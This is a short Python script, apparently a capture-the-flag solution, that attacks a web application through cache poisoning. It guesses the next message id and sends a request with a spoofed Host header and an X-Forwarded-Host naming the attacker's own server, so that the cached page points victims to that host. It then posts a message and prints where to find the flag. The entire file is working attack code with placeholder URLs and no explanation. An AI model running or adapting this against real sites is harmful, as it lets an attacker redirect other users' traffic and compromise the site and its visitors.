#!/usr/bin/python3
import requests
import time
import random
import re 

my_server = "Server_URL"
base_url = "<Target_URL"

def get_current_id():
    url = f"http://{base_url}/message/{random.randint(1000, 10000)}"
    r = requests.get(url)
    return r.json().get("count")

def make_cache(id_):
    url = f"http://{base_url}/letters?id={id_}"
    headers = {
        "host": "127.0.0.1",
        "X-Forwarded-Host": my_server
    }
    r = requests.get(url, headers=headers)
    
    # Debugging statements
    print(f"Request URL: {url}")
    print(f"Request Headers: {headers}")
    print(f"Response Status Code: {r.status_code}")
    print(f"Response Text: {r.text}")

    if re.search(headers.get("X-Forwarded-Host"), r.text):
        print(f"[*] make {id_} cache success")
    else:
        print(f"[*] make {id_} cache failed")

def hack():
    current_id = get_current_id()
    next_id = current_id + 1
    print(f"next_id: {next_id}")
    make_cache(next_id)
    pwned_id = next_id + 1
    print("[*] start")
    url = f"http://{base_url}/submit"
    data = {
        "message": "Pwn3d"
    }
    r = requests.post(url, json=data)

    # Debugging statements
    print(f"Submit Request URL: {url}")
    print(f"Submit Request Data: {data}")
    print(f"Submit Response Status Code: {r.status_code}")
    print(f"Submit Response Text: {r.text}")
    print(f"Check letters?id={pwned_id} for the flag!")

hack()
